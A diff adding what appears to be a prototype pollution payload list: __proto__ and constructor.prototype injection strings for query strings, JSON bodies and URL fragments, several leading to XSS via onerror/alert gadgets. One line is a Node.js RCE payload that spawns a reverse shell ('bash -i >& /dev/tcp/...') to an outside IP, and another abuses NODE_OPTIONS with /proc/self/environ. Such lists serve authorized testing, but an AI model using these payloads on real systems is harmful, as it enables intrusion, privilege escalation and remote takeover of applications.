@@ -1,0 +1,28 @@
+var myDog = new Dog();
+myDog.constructor;
+myDog.constructor.prototype;
+myDog.__proto__;
+myDog["__proto__"];
+{ "__proto__":{"ignoreQueryPrefix":true}} + ??foo=bar
+{ "__proto__":{"allowDots":true}} + ?foo.bar=baz
+{ "__proto__":{"json spaces":" "}} + {"foo":"bar"}
+{ "__proto__":{"exposedHeaders":["foo"]}}
+{ "__proto__":{"status":510}}
+#a=b&__proto__[admin]=1
+#__proto__[xxx]=alert(1)
+?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E
+?__proto__[src]=image&__proto__[onerror]=alert(1)
+?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)
+.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.0.136/12345 0>&1");process.exit()//')
+.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
+Object.__proto__["evilProperty"]="evilPayload"
+Object.__proto__.evilProperty="evilPayload"
+Object.constructor.prototype.evilProperty="evilPayload"
+Object.constructor["prototype"]["evilProperty"]="evilPayload"
+{"__proto__": {"evilProperty": "evilPayload"}}
+{"__proto__.name":"test"}
+x[__proto__][abaeead] = abaeead
+x.__proto__.edcbcab = edcbcab
+__proto__[eedffcb] = eedffcb
+__proto__.baaebfc = baaebfc
+?__proto__[test]=test
